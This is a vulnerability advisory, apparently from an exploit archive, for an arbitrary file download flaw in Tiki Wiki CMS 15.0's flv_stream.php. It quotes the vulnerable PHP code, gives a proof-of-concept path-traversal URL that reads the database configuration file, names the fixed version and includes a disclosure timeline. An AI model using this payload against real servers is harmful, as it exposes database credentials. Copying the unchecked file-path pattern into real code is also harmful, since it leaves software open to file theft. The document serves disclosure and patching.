# Date: 11-07-2016
# Software Link: https://tiki.org
# Exploit Author: Kacper Szurek
# Contact: http://twitter.com/KacperSzurek
# Website: http://security.szurek.pl/
# Category: webapps
  
1. Description
 
Using `flv_stream.php` file from `vendor` directory we can download any file.
 
http://security.szurek.pl/tiki-wiki-cms-150-arbitrary-file-download.html
 
File: tiki-15.0\vendor\player\flv\flv_stream.php
 
<?php
session_cache_limiter(&#039;nocache&#039;);
header(&#039;Expires: Thu, 19 Nov 1981 08:52:00 GMT&#039;);
header(&#039;Pragma: no-cache&#039;);
 
$position = $_GET[&#039;position&#039;];
$filename = dirname(__FILE__).&#039;/&#039;.htmlspecialchars($_GET[&#039;file&#039;]);
 
 
if (file_exists($filename)) {
    header(&#039;Content-Type: video/x-flv&#039;);
    if ($position != 0) {
        echo &#039;FLV&#039;, pack(&#039;CCNN&#039;, 1, 1, 9, 9);
    }
    $file = fopen($filename, "rb");
    fseek($file, $position);
    while (!feof($file)) {
        echo fread($file, 16384);
    }
    fclose($file);
} else {
    echo &#039;The file does not exist&#039;;
}
?>
 
2. Proof of Concept
 
Example for downloading database configuration:
 
http://tiki/vendor/player/flv/flv_stream.php?file=../../../db/local.php&position=0
 
3. Solution:
    
Update to version 15.1
 
Timeline:
 
    01-06-2016: Discovered
    01-06-2016: Vendor notified
    08-06-2016: Version 15.1 released, issue resolved

